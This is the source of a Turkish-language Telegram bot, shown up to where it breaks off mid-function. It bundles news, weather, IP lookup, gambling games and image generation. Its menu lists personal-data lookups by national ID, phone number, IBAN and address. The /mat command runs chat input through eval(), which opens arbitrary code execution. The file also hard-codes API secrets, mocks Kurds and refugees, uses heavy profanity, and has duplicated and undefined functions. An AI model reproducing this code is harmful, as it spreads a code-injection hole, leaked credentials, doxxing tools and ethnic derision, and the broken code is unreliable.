import telebot
import json
import requests
import urllib
import telebot
import time
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests
import sqlite3
import telegram
import random
import webbrowser
from telegram.ext import Updater, CommandHandler, ConversationHandler, CallbackQueryHandler
from pytube import YouTube
from youtubesearchpython import VideosSearch
from youtube_search import YoutubeSearch
import os
import types
import requests
import base64
import string
import mysql.connector
from datetime import datetime, timedelta
import urllib.parse
from telebot import TeleBot, types
from collections import defaultdict
from threading import Thread
import logging
import asyncio
from telethon import Button, TelegramClient, events
import re
from threading import Lock
from bs4 import BeautifulSoup
from telebot.types import Message
from telebot.types import Update, InlineKeyboardButton, InlineKeyboardMarkup
from fake_email import Email

from rich.console import Console

import telebot

from pytube import YouTube

from youtubesearchpython import VideosSearch

import os

import time

from datetime import datetime

import telebot

import random, requests

import json

import time

import os

from telebot import TeleBot, types

from collections import defaultdict

from threading import Thread

import os

import sys

import time

import marshal

import base64 

import zlib

import py_compile

import re

from bs4 import BeautifulSoup

import datetime

import requests

console = Console()

user_data = {}

game_sessions = {}

user_last_message_time = defaultdict(float)

BALANCE_FILE = 'balances.json'

SUDO_USERS = ['6050993546', '6958129929', ""]  

user_balances = {}

kelimeler = ['yatak', 'meyve', 'elma', 'araba', 'kertenkele', 'hayvan', 'aslan', 'köpek', 'spor', 'pizza', 'et', 'yumurta', 'yat', 'kalk', 'portakal', 'öğretmen', 'tembel', 'doksan', 'havuç', 'yardım', 'telefon', 'tablet', 'hava', 'güneş', 'yağmur', 'sandalye', 'kaplan', 'kapı']

last_message_times = {}

word_game_sessions = {}

FLOOD_TIMEOUT = 60  

MAX_MESSAGES = 5  

user_last_message_time = {}

bekleyen_kullanıcılar = {}

enc_url = 'https://google.com/broadcast-free'

TOKEN = ("7467806086:AAGGOiF1iGxiBJKKJIiU3tz4rkdEoEVMqS8")


bot = telebot.TeleBot(TOKEN)

print("BOT AKTİF EDİLDİ...")

game_sessions = {}

user_last_message_time = defaultdict(float)


BOT_OWNER_ID = '6958129929'   


JSON_FILE = 'premiumuser.json'







def check_private_chat(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "Bu komut yalnızca özel mesajlarda kullanılabilir.")
        return False
    return 



def log_message(user_id):
    current_time = time.time()
    if user_id not in last_message_times:
        last_message_times[user_id] = []
    last_message_times[user_id].append(current_time)


CHANNEL_ID = -1002245175746
CHANNEL_LINK = "https://t.me/BotAltyapi"
GROUP_ID = -1002228388312
GROUP_LINK = "https://t.me/BotAltyapiChat"
chat_id_destek = -1002228388312
yasakli_kelimeler = {}
def get_news(il, tarih):
    """
    Verilen il ve tarih için haberleri çeker ve haberler.txt dosyasına kaydeder.

    Args:
        il: Haberlerin çekileceği il.
        tarih: Haberlerin çekileceği tarih (YYYY-MM-DD formatında).

    Returns:
        Haberlerin kaydedildiği dosya yolu veya hata durumunda bir hata mesajı.
    """

    url = f'https://newsapi.org/v2/everything?q={il}&from={tarih}&sortBy=publishedAt&apiKey=d023213321544886aec9fc0c25128c81'
    response = requests.get(url)

    if response.status_code == 200:
        data = json.loads(response.text)
        articles = data.get('articles', [])

        if articles:
            with open("haberler.txt", "w", encoding="utf-8") as f:
                for i, article in enumerate(articles):
                    f.write(f"Haber {i+1}:\n")
                    f.write(f"Başlık: {article['title']}\n")
                    f.write(f"Açıklama: {article['description']}\n")
                    f.write(f"URL: {article['url']}\n\n")
            return "haberler.txt"
        else:
            return f"Üzgünüm, {il} ili ve {tarih} tarihi için bir haber bulamadım."
    else:
        return "Haberler alınırken bir hata oluştu. Lütfen daha sonra tekrar deneyin."
last_usage = {}




premium_user_ids = [6782067807, 6958129929] 



required_channels = ["-1002245175746", "-1002228388312"]


komutlar = {
    "🚀 Sorgu Bölümü": """
/adsoyad - Ad Soyad Sorgu
/adsoyadil - Ad Soyad İl Sorgu
/adsoyadililce - Ad Soyad İl İlçe Sorgu
/tc - TC Sorgu
/cocuk - Çocuk Sorgu
/yegen - Yeğen Sorgu
/aile - Aile Sorgu
/ailepro - Aile Sorgu Pro
/tcgsm - TC'den GSM Sorgu
/gsmtc - GSM'den TC Sorgular
/iban - İban Sorgu
/hayathikayesi - Hayatı Hikayesi Sorgular
/adres - Adres Sorgular
/ip - ip sorgu çeker
""",
    "🔮 Yararlı Komutlar": """
/hava - Hava Durumu
/eczane - Eczane Bilgileri
/tv - Yazılan Filmin Bilgilerini Verir
/haber - Haber Bilgileri Verir
/tatil - Resmi Tatilleri Söyler
/tdk - Metni TDK'da Sorgular
/postakodu - Posta Kodundan Bilgi Verir
/sifre - Rastgele Şifre Üret
/ayet - Ayet Söyler
/dolar - Güncel Dolar Fiyatı Verir
/eskikur - Geçmiş Zaman Dolar Fiyatı Verir
/morse - Metni Morse ile Şifreler
/sitebilgi - Girdiğin Sitenin Başlığını Söyler
/mail - Fake Mail Oluştur
/refresh - Maile Gelen Kodu Göster
/kurt - Kurtluk Ölçer
/turk - Türk'lük Ölçer
/hayal - yazdiginiz şeyi hayal eder
/multeci - Mültecilik Ölçer
/dg - doğum gününe kaç gün kaldığını söyler
/font - istediğiniz yazının fontlu halini atar
/mat - matematik çözer
""",
    "🔫 Chat Komutları": """
/sohbetac - Sohbet Modunu Açar
/sohbetkapat - Sohbet Modunu Kapatır
/gptac - Chat GPT Modunu Açar
/gptkapat - Chat GPT Modunu Kapatır
/mute - Mute Atar
/unmute - Mute Kaldırır
/admin - Adminlik Verir
/unadmin - Adminliği Alır
""",
    "💎 +18 Komutlar": """
/yaz [metin] - Metni Deftere Yazar
/meme - Memeye Yazı Yazar
/meme1 - Memeye Yazı Yazar
/meme2 - Memeye Yazı Yazar
/meme3 - Memeye Yazı Yazar
/got - Göte Yazı Yazar
/got1 - Göte Yazı Yazar
/cm - Çavuşun Boyunu Ölçer
""",
    "📨 Muzik Video": """
/muzik [şarkı adı] - Şarkı İndir
/video [video adı] - Video İndir
/tiktok - TikTok Videolarını İndirir (Fligransız)
""",
    "❤️‍🩹 Kumar": "Başlangıç bakiyesi olarak 55000 bakiye verilir\n\n/risk - Risk oyunu oynayıp bakiye kazanabilirsiniz.\n\n/slot [miktar]: 🎰 Slot oyununu oynamak için bahis yapın.\n\n/kelime: 🔢 Kelime Tahmin Oyununu Oynayarak 2500 tl Kazan.\n\n/bakiye: 💰 Mevcut bakiyenizi kontrol edin.\n\n/borc [Kullanıcı İd] [miktar]: 💸 Başka bir kullanıcıya bakiye göndermesi yapın.\n\n/zenginler: 🏆 Genel Sıralamayı gösterir"
}

premium_komutlar = """
/premium1 - Premium Komut 1
/premium2 - Premium Komut 2
/premium3 - Premium Komut 3
"""

# Kullanıcının belirli kanallara katılıp katılmadığını kontrol edin
def check_subscription(user_id):
    for channel in required_channels:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except Exception as e:
            print(f"Error checking subscription for {channel}: {e}")
            return False
    return True

# /start komutu için handler
@bot.message_handler(commands=['start'])
def orospum(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, 'Flood yapma 5 saniye bekle.')
        return
    log_message(user_id)

    if user_id not in user_balances:
        user_balances[user_id] = 55000 
        save_balances()  
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("Sahibim ❤️‍🩹", url="https://t.me/ramowlfbio")
    button2 = telebot.types.InlineKeyboardButton("Komutlar ❤️‍🔥", callback_data="komutlar")
    button3 = types.InlineKeyboardButton("Kanal 😍", url="https://t.me/BotAltyapi")
    button4 = types.InlineKeyboardButton("Beni Gruba Ekle💫", url="https://t.me/Botaltyapi_bot?startgroup=new")
    markup.add(button1, button2, button3, button4)
    bot.reply_to(message, "👋 Merhaba Ben her sike yarayan bir botum", reply_markup=markup)

# Callback query handler
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global komutlar
    if call.data == "komutlar":
        if check_subscription(call.from_user.id):
            markup = types.InlineKeyboardMarkup(row_width=2)
            for kategori in komutlar:
                button = types.InlineKeyboardButton(kategori, callback_data=f"kategori_{kategori}")
                markup.add(button)
            # Premium komutlar butonu
            markup.add(types.InlineKeyboardButton("Premium Komutlar", callback_data="premium"))
            markup.add(types.InlineKeyboardButton("Geri", callback_data="geri"))
            bot.edit_message_text(chat_id=call.message.chat.id,
                                  message_id=call.message.message_id,
                                  text="Lütfen bir kategori seçin:",
                                  reply_markup=markup)
        else:
            # Komutlar kısmına erişim izni verilmediğinde mesaj gönder
            bot.send_message(call.message.chat.id, "Komutlar kısmını açabilmek için @BotAltyapi ve @BotAltyapiChat kanallarına katılmanız gerekmektedir.")
    elif call.data.startswith("kategori_"):
        kategori_adi = call.data[9:]  # "kategori_" kısmını kaldır
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Geri", callback_data="komutlar"))
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=f"*{kategori_adi}*\n\n{komutlar[kategori_adi]}",
                              parse_mode="Markdown",
                              reply_markup=markup)
    elif call.data == "premium":
        if call.from_user.id in premium_user_ids:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("Geri", callback_data="komutlar"))
            bot.edit_message_text(chat_id=call.message.chat.id,
                                  message_id=call.message.message_id,
                                  text=f"*Premium Komutlar*\n\n{premium_komutlar}",
                                  parse_mode="Markdown",
                                  reply_markup=markup)
        else:
            bot.send_message(call.message.chat.id, "Premium komutlara erişiminiz yok.")
    elif call.data == "geri":
        start(call.message)
    elif call.data == "hakkimizda":
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text="Birçok bot ve yararlı içeriklerin olduğu kanalımıza katılmayı unutmayın  @BotAltyapi",
                              reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Geri", callback_data="geri")))

@bot.message_handler(commands=['ip'])
def botaltyapi(message):
    try:
        ip = message.text.split(' ')[1].strip()

        api_url = f'http://ip-api.com/json/{ip}'
        response = requests.get(api_url)

        if response.status_code == 200:
            data = response.json()

            BotAltyapi = (
                f"ÜLKE: {data['country']}\n"
                f"ÜLKE KODU: {data['countryCode']}\n"
                f"BÖLGE: {data['region']}\n"
                f"BÖLGE ADI: {data['regionName']}\n"
                f"ŞEHİR: {data['city']}\n"
                f"ZIP KOD: {data['zip']}\n"
                f"ENLEM: {data['lat']}\n"
                f"SAAT DİLİMİ: {data['timezone']}\n"
                f"İSP: {data['isp']}\n"
                f"ORG: {data['org']}\n"
            )

            bot.reply_to(message, BotAltyapi)
        else:
            bot.reply_to(message, "başarısız sorgu")

    except IndexError:
        bot.reply_to(message, "Hayalistan ipleri mevcut değil")
    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")


def azginbot(chat_id, message):
    bot.send_message(chat_id, message)

def fontsikis(chat_id, font_name):
    font_api = f"https://coolnames.online/cool.php?name={font_name}"
    response = requests.get(font_api)
    soup = BeautifulSoup(response.content, 'html.parser')
    fonts = soup.find_all('textarea')

    if fonts:
        for font in fonts:
            send_message(chat_id, font.text.strip())
            

@bot.message_handler(commands=['font'])
def buyukyarrak(message):
    chat_id = message.chat.id
    command_params = message.text.split()[1:]

    if command_params:
        font_name = ' '.join(command_params)
        generate_and_send_fonts(chat_id, font_name)
    else:
        send_message(chat_id, "Örnek kullanım: /font @BotAltyapi")

def tyrafiyiskm_ramazanabe(ramazanabe):
    ramazanabe = ramazanabe.replace('^', '**') 
    ramazanabe = ramazanabe.replace('×', '*')   
    ramazanabe = ramazanabe.replace('÷', '/')  
    
    ramazanabe = re.sub(r'(?<!\d)(?P<num1>\d+)(?P<op>\()(?P<num2>\d+)', r'\g<num1>*\g<num2>', ramazanabe)
    ramazanabe = re.sub(r'(?P<num1>\))(?P<op>\d+)(?P<num2>\d+)', r'\g<num1>*\g<num2>', ramazanabe)
    
    return ramazanabe

def tyrafi_gotunu_ramazansiksin(ramazanabe):
    try:
        ramazanabe = tyrafiyiskm_ramazanabe(ramazanabe) 
        ensarigotten = eval(ramazanabe)
        return ensarigotten, ramazanabe
    except Exception as e:
        return None, ramazanabe

@bot.message_handler(commands=['mat'])
def wexzogotten(message):
    try:
        msg_text = message.text[len('/mat '):].strip()
        if msg_text.replace("-", "").isdigit():
            ensarigotten = eval(msg_text)
            response = f"{msg_text} = {ensarigotten}"
            bot.reply_to(message, response)
        elif any(char in msg_text for char in ['+', '-', '*', '/', '^', '×', '÷']):
            ensarigotten, ramazanabe = tyrafi_gotunu_ramazansiksin(msg_text)
            if ensarigotten is not None:
                response = f"{ramazanabe} = {ensarigotten}"
                bot.reply_to(message, response)
            else:
                bot.reply_to(message, "anani sikerim böyle kullan: /mat 5+5")
        else:
            bot.reply_to(message, "ananı sikerim böyle kullan: /mat 5+5")
    except Exception as e:
        bot.reply_to(message, f"Hata: {e}")

@bot.message_handler(commands=['info'])
def info(message):
    user = None

    if message.reply_to_message:
        user = message.reply_to_message.from_user
    else:
        args = message.text.split()
        if len(args) > 1:
            user_input = args[1]
            if user_input.startswith('@'):
                user = bot.get_user(user_input[1:])  
            else:
                try:
                    user_id = int(user_input)
                    user = bot.get_user(user_id)
                except ValueError:
                    bot.reply_to(message, "adamı bulamadım")
                    return
        else:
            user = message.from_user

    if user:
        username = f"@{user.username}" if user.username else "Kullanıcı adı yok"
        user_link = f"[{user.first_name} {user.last_name}]({user.id})" if user.username else f"[{user.first_name} {user.last_name}](tg://user?id={user.id})"

        info_text = (f"🆔 ID: {user.id}\n"
                     f"👱 İsim: {user.first_name}\n"
                     f"🌐 Kullanıcı Adı: {username}\n"
                     f"PROFİL BAĞLANTISI: [Tıkla](tg://user?id={user.id})")

        bot.reply_to(message, info_text, parse_mode='Markdown')
    else:
        bot.reply_to(message, "Kullanıcı bulunamadı")

@bot.message_handler(commands=['dg'])
def sikisgunu(message):
    try:
        msg = message.text.split()
        if len(msg) != 2:
            raise ValueError
        
        dogum_gunu = datetime.datetime.strptime(msg[1], "%d/%m/%Y")
    except ValueError:
        bot.reply_to(message, "Kullanım: /dg 22/08/2006")
        return

    su_an = datetime.datetime.now()
    dogum_gunu = dogum_gunu.replace(year=su_an.year)

    if dogum_gunu < su_an:
        dogum_gunu = dogum_gunu.replace(year=su_an.year + 1)

    kalan_gun = (dogum_gunu - su_an).days

    if kalan_gun == 0:
        bot.reply_to(message, f"Bugün doğum günün İyiki doğdun ❤️")
    else:
        bot.reply_to(message, f"Doğum gününüze {kalan_gun} gün kaldı")

   
   

# Start the bot

   
last_usage = {}

ban_list_filename = 'ban_list.json'

# Ban listesini yükle veya oluştur
try:
    with open(ban_list_filename, 'r') as file:
        ban_list = json.load(file)
except FileNotFoundError:
    ban_list = []


def is_bot_owner(user_id):
    return str(user_id) == BOT_OWNER_ID

# Ban listesini dosyaya kaydeden yardımcı fonksiyon
def save_ban_list():
    with open(ban_list_filename, 'w') as file:
        json.dump(ban_list, file, indent=4)

# Banlı kullanıcı kontrolü yapan yardımcı fonksiyon
def is_user_banned(user_id):
    return str(user_id) in ban_list

# Yetkili kullanıcı kimlikleri
AUTHORIZED_USER_IDS = [6782067807, 6958129929]  # Gerçek kullanıcı kimlikleri ile değiştirin

@bot.message_handler(commands=['turk', 'kurt', 'multeci'])
def calculate_and_send_percentage(message):
    

    user_name = message.from_user.first_name

    category = message.text.replace("/", "")  # Komuttan "/" karakterini çıkararak kategori belirleme

    random_percent = random.uniform(1, 100)

    if category == 'turk':
        if random_percent <= 50:
            text = f"{user_name} için:\n\nHesaplandı! %{random_percent:.2f} Türk'sün! Hewal, Gel dağa kaçak!"
        else:
            text = f"{user_name} için:\n\nHesaplandı! %{random_percent:.2f} Türk'sün! Babayiğit, Gel PKK avına çıkalım!"
    elif category == 'kurt':
        if random_percent <= 50:
            text = f"{user_name} için:\n\nHesaplandı! %{random_percent:.2f} Kürt'sün! Babayiğit, Ülken var!"
        else:
            text = f"{user_name} için:\n\nHesaplandı! %{random_percent:.2f} Kürt'sün! Hewal, Bomba Geldi Kaç!"
    elif category == 'multeci':
        if random_percent <= 50:
            text = f"{user_name} için:\n\nHesaplandı! %{random_percent:.2f} Mülteci'siniz! Babayiğit, Helal lan!"
        else:
            text = f"{user_name} için:\n\nHesaplandı! %{random_percent:.2f} Mülteci'siniz! Abi, Esat Bize bum bum!"

    bot.reply_to(message, text)


@bot.message_handler(commands=['haber'])
def handle_haber(message):
    
    
    
    """
    '/haber il tarih' komutunu işler, haberleri dosyaya kaydeder
    ve kullanıcıya dosyayı gönderir.
    """
    try:
        _, il, tarih = message.text.split(" ", 2)
        dosya_yolu = get_news(il, tarih)
        
        if dosya_yolu.endswith(".txt"):
            with open(dosya_yolu, 'rb') as f:
                bot.send_document(message.chat.id, f)
            os.remove(dosya_yolu) # Dosyayı gönderdikten sonra sil
        else:
            bot.send_message(message.chat.id, dosya_yolu) 

    except ValueError:
        bot.send_message(message.chat.id, "Lütfen komutu şu şekilde kullanın: /haber il tarih (örneğin: /haber İstanbul 2024-06-14)")


API_ENDPOINT = "https://tilki.dev/api/google-ara?q="

@bot.message_handler(commands=['ara'])
def handle_ara(message):
    
    chat_id = message.chat.id
    user_id = message.from_user.id

    # Komutun sadece özel mesajda çalışması için kontrol
    if message.chat.type != "private":
        bot.send_message(chat_id, "Bu komut sadece özel mesajlarda kullanılabilir.")
        return

    if str(user_id) in ban_list:
        bot.send_message(chat_id, "Ananın Ammını Gördün Bottan Banlısın Orosbu Cocugu.")
        return

    try:
        _, arama_terimi = message.text.split(" ", 1)
        url = API_ENDPOINT + arama_terimi

        # API'den veri çekme
        response = requests.get(url)
        response.raise_for_status()  # Hataları kontrol et
        data = response.json()

        # Verileri işleme
        if data:
            for item in data:
                # Her bir sonuç için mesaj oluşturma
                text = f"*Başlık:* {item['title']}\n*Link:* {item['link']}\n*Özet:* {item['snippet']}"
                bot.send_message(chat_id, text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "Arama sonucu bulunamadı.")

    except ValueError:
        bot.send_message(chat_id, "Lütfen komutu şu şekilde kullanın: /ara [arama terimi] (örneğin: /ara tsgmods.com.tr)")
    except requests.exceptions.RequestException as e:
        bot.send_message(chat_id, f"Hata oluştu: {e}")

@bot.message_handler(commands=['tiktokbilgi'])
def tiktok_bilgi(message):
    try:
        link = message.text.split()[1]
        api_url = f"https://tilki.dev/api/tiktok-video-bilgi?link={link}"
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            response_text = (
    f"**Kullanıcı Bilgisi**\n"
    f"👤 **Kullanıcı Adı**: {data['ad']}\n"
    f"🆔 **Kullanıcı ID**: {data['ad_id']}\n"
    f"[![Avatar]({data['avatar_link']})](https://www.tiktok.com/@{data['ad_id']})\n\n"
    f"**Video Bilgisi**\n"
    f"👀 **İzlenme**: {data['video_izlenme']}\n"
    f"❤️ **Beğenme**: {data['video_begenme']}\n"
    f"💬 **Yorum**: {data['video_yorum']}\n"
    f"🔄 **Paylaşma**: {data['video_paylas']}\n"
    f"📥 **İndirme**: {data['indirme_sayisi']}\n"
    f"[![Video Kapağı]({data['video_kapak']})]({data['video_link']})\n\n"
    f"**Müzik Bilgisi**\n"
    f"🎵 **Müzik Adı**: {data['muzik_adi']}\n"
    f"[![Müzik Kapağı]({data['muzik_kapak']})]({data['muzik_link']})\n"
)
            bot.send_message(message.chat.id, response_text, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "Hata Video Bilgilerine Ulaşılamadı")
    except IndexError:
        bot.send_message(message.chat.id, "Lütgen Geçerli Bir Tiktok Linki Gir [Web Tarayıcısı Üzerinden Linkleri Tek Kabul Eder]")
    except Exception as e:
        bot.send_message(message.chat.id, f" Hata Oluştu")

def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(str(e))
        return False
        
import requests
import telebot
from bs4 import BeautifulSoup
import re
import time

sohbet_modu = False
sohbet_modlari = {}


def sadece_yoneticiler(func):
    def wrapper(message):
        # Mesajı gönderen kullanıcının rolünü al
        chat_member = bot.get_chat_member(message.chat.id, message.from_user.id)

        # Sadece kanal yöneticileri ve yaratıcıları sohbet modunu değiştirebilir
        if chat_member.status in ["administrator", "creator"]:
            return func(message)
        else:
            bot.send_message(message.chat.id, "Bu komutu kullanmak için kanal yöneticisi olmanız gerekiyor.")
    return wrapper

@bot.message_handler(commands=['sohbetac'])
@sadece_yoneticiler
def sohbet_modunu_ac(message):
    
    global sohbet_modlari
    kanal_id = message.chat.id
    sohbet_modlari[kanal_id] = True
    bot.send_message(message.chat.id, "Sohbet modu aktif edildi.")

@bot.message_handler(commands=['sohbetkapat'])
@sadece_yoneticiler
def sohbet_modunu_kapat(message):
    
    global sohbet_modlari
    kanal_id = message.chat.id
    sohbet_modlari[kanal_id] = False
    bot.send_message(message.chat.id, "Sohbet modu kapatıldı.")

@bot.message_handler(func=lambda message: sohbet_modlari.get(message.chat.id, False))
def sohbet_cevap_gonder(message):
    # Kullanıcıdan gelen metni al
    soru = message.text

    # API'ye istek gönder
    response = requests.get(f'https://tilki.dev/api/sohbet?soru={soru}')
    data = response.json()
    text = data['cevap']

    # Kontrol et, eğer belirli bir metin varsa özel bir mesaj gönder
    if "benim babam utiricdir lan (birde **nochad.dev**)" in text.lower():
        bot.send_message(message.chat.id, "Benim Babalarım bu kanalda > @BotAltyapi.")
    else:
        bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['haber'])
def get_news(update, context):
    
    
    
    try:
        args = update.message.text.split()
        if len(args) != 3:
            update.message.reply_text("Geçersiz komut. Kullanım: /haber il tarih")
            return

        il = args[1]
        tarih = args[2]


        try:
            tarih_objesi = datetime.strptime(tarih, "%Y-%m-%d")
            tarih = tarih_objesi.strftime("%Y-%m-%dT%H:%M:%SZ")
        except ValueError:
            update.message.reply_text("Geçersiz tarih formatı. Lütfen YYYY-MM-DD formatını kullanın.")
            return


        dün = tarih_objesi - timedelta(days=1)
        dün_str = dün.strftime("%Y-%m-%dT%H:%M:%SZ")


        url = f"https://newsapi.org/v2/everything?q={il}&from={dün_str}&to={tarih}&sortBy=publishedAt&apiKey={NEWS_API_KEY}"
        response = requests.get(url)
        data = response.json()


        if data["status"] == "ok" and data["totalResults"] > 0:
            articles = data["articles"]
            for article in articles:
                mesaj = f"""
**{article["title"]}**

{article["description"]}

{article["url"]}
"""
                update.message.reply_text(mesaj)
        else:
            update.message.reply_text("Bu kriterlere uygun haber bulunamadı.")
    except IndexError:
        update.message.reply_text("Geçersiz komut. Kullanım: /haber il tarih")

@bot.message_handler(commands=['postakodu'])
def postakodu_handler(message):
    
    
    
    try:
        postakodu = message.text.split()[1]
        url = f"https://api.zippopotam.us/tr/{postakodu}"
        response = requests.get(url)
        response.raise_for_status()  #

        data = response.json()

        if len(data['places']) > 10:
           
            with open('postakodu.txt', 'w', encoding='utf-8') as f:
                for i, place in enumerate(data['places']):
                    f.write(f"{i+1}. {place['place name']}, {data['country']} ({data['country abbreviation']})\n")
                    f.write(f"   Enlem: {place['latitude']}, Boylam: {place['longitude']}\n\n")

            with open('postakodu.txt', 'rb') as f:
                bot.send_document(message.chat.id, document=("postakodu.txt", f)) 
        else:
           
            places_text = "\n".join([
                f"{i+1}. {place['place name']}, {data['country']} ({data['country abbreviation']})\n"
                f"   Enlem: {place['latitude']}, Boylam: {place['longitude']}"
                for i, place in enumerate(data['places'])
            ])
            message_text = (
                f"Posta Kodu: {data['post code']}\n"
                f"Ülke: {data['country']} ({data['country abbreviation']})\n\n"
                f"Yerler:\n{places_text}"
            )
            bot.send_message(message.chat.id, message_text)

    except IndexError:
        bot.send_message(message.chat.id, "Lütfen postakodunu girin. Örnek: /postakodu 09000")
    except requests.exceptions.RequestException:
        
        bot.send_message(message.chat.id, "Bilgileri alırken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
        

def get_news(il, tarih):
    """
    Verilen il ve tarih için haberleri çeker ve haberler.txt dosyasına kaydeder.

    Args:
        il: Haberlerin çekileceği il.
        tarih: Haberlerin çekileceği tarih (YYYY-MM-DD formatında).

    Returns:
        Haberlerin kaydedildiği dosya yolu veya hata durumunda bir hata mesajı.
    """

    url = f'https://newsapi.org/v2/everything?q={il}&from={tarih}&sortBy=publishedAt&apiKey=d023213321544886aec9fc0c25128c81'
    response = requests.get(url)

    if response.status_code == 200:
        data = json.loads(response.text)
        articles = data.get('articles', [])

        if articles:
            with open("haberler.txt", "w", encoding="utf-8") as f:
                for i, article in enumerate(articles):
                    f.write(f"Haber {i+1}:\n")
                    f.write(f"Başlık: {article['title']}\n")
                    f.write(f"Açıklama: {article['description']}\n")
                    f.write(f"URL: {article['url']}\n\n")
            return "haberler.txt"
        else:
            return f"Üzgünüm, {il} ili ve {tarih} tarihi için bir haber bulamadım."
    else:
        return "Haberler alınırken bir hata oluştu. Lütfen daha sonra tekrar deneyin."

@bot.message_handler(commands=['haber'])
def handle_haber(message):
    
    """
    '/haber il tarih' komutunu işler, haberleri dosyaya kaydeder
    ve kullanıcıya dosyayı gönderir.
    """
    try:
        _, il, tarih = message.text.split(" ", 2)
        dosya_yolu = get_news(il, tarih)
        
        if dosya_yolu.endswith(".txt"):
            with open(dosya_yolu, 'rb') as f:
                bot.send_document(message.chat.id, f)
            os.remove(dosya_yolu) 
        else:
            bot.send_message(message.chat.id, dosya_yolu) 

    except ValueError:
        bot.send_message(message.chat.id, "Lütfen komutu şu şekilde kullanın: /haber il tarih (örneğin: /haber İstanbul 2024-06-14)")
def translate_holiday_name(name):
   
    translation_dict = {
        "New Year's Day": "Yılbaşı",
        "National Independence & Children's Day": "23 Nisan",
        "Labour Day": "İşçiler Bayramı",
        "Atatürk Commemoration & Youth Day": "19 Mayıs Atatürk'ü Anma, Gençlik ve Spor Bayramı",
        "Democracy and National Unity Day": "Demokrasi ve Millî Birlik Günü ",
        "Victory Day": "Zafer Bayramı",
        "Republic Day": "Cumhuriyet Bayramı",
        "Christmas Day": "Noel",
       
    }

    return translation_dict.get(name, name)

@bot.message_handler(commands=['tatil'])
def get_public_holidays(message):
    
    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise IndexError("Yanlış kullanım. Örnek: /tatil 2023 TR")

        yil = command_parts[1]
        ulke_kodu = command_parts[2].upper()

        url = f"https://date.nager.at/api/v2/publicholidays/{yil}/{ulke_kodu}"
        response = requests.get(url)
        response.raise_for_status()

        tatiller = response.json()

        if tatiller:
            mesaj = f"*{yil} yılı için {ulke_kodu} resmi tatiller:*\n\n"
            for tatil in tatiller:
                translated_name = translate_holiday_name(tatil['name'])
                mesaj += f"- *{translated_name}*: {tatil['date']}\n"
            bot.send_message(message.chat.id, mesaj, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, f"Üzgünüm, {yil} yılı için {ulke_kodu} ülkesinde resmi tatil bulunamadı.")

    except IndexError as e:
        bot.send_message(message.chat.id, str(e))
    except requests.exceptions.RequestException:
        bot.send_message(message.chat.id, "Bilgileri alırken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
        
@bot.message_handler(commands=['hayal'])
def generate_image(message):
    
    chat_id = message.chat.id
    
    try:
       
        query = message.text.split(maxsplit=1)[1]

       
        msg = bot.send_message(chat_id, "Hayal ederken biraz bekleyin...")

       
        if any(keyword in query.lower() for keyword in ['kürdistan', 'kurdistan', 'kurd']):
            bot.send_message(chat_id, "Hocam, olmayan bir şeyi nasıl hayal edeyim?")

        else:
            url = f'https://tilki.dev/api/imagine?q={query}'
            response = requests.get(url)
            data = response.json()

            if 'url' in data:
                image_url = data['url']

                
                sent_image = bot.send_photo(chat_id=chat_id, photo=image_url)

               
                fun_messages = [
                    f"{message.from_user.first_name} için hayal ettikten sonra gelen şahane bir resim!",
                    f"{message.from_user.first_name}, bu senin için hayal edilen bir şey!",
                    f"Hey {message.from_user.first_name}, işte senin için bir hayal ürünü!"
                ]

                
                bot.send_message(chat_id=chat_id, text=random.choice(fun_messages))

               
                bot.delete_message(chat_id, msg.message_id)

            else:
                bot.reply_to(message, "Üzgünüm, istenen resim bulunamadı.")
    
    except IndexError:
        bot.reply_to(message, "Lütfen /hayal komutunu kullanırken bir kelime veya cümle belirtin.")
    
    except Exception as e:
        print(f'Hata oluştu: {e}')
        bot.reply_to(message, "Resim oluşturulurken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
        bot.send_message(chat_id, "İşlem sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.")





@bot.message_handler(commands=['tv'])
def tv_show_info(message):
    
    try:
        search_query = message.text.split(' ', 1)[1]  # Komuttan sonra gelen arama sorgusunu al
        url = f"https://api.tvmaze.com/search/shows?q={search_query}"
        response = requests.get(url)
        response.raise_for_status()

        data = response.json()

        if data:
           
            show = data[0]['show']

           
            message_text = f"*{show['name']}* ({show.get('language', 'Bilinmiyor')})\n"
            message_text += f"Tür: {', '.join(show['genres'])}\n"
            message_text += f"Durum: {show['status']}\n"
            message_text += f"IMDB Puanı: {show['rating'].get('average', 'Belirtilmemiş')}\n"
            message_text += f"Daha Fazla Bilgi: {show['url']}"

           
            if show['image'] and show['image']['medium']:
                bot.send_photo(message.chat.id, show['image']['medium'])

            
            bot.send_message(message.chat.id, message_text, parse_mode='Markdown')

        else:
            bot.send_message(message.chat.id, f"Üzgünüm, '{search_query}' için bir sonuç bulunamadı.")

    except IndexError:
        bot.send_message(message.chat.id, "Lütfen bir dizi adı girin. Örnek: /tv Yasak Elma")
    except requests.exceptions.RequestException:
        bot.send_message(message.chat.id, "Bilgileri alırken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")















@bot.message_handler(commands=['hava'])
def hava_durumu_gonder(message):
    
    
    
    
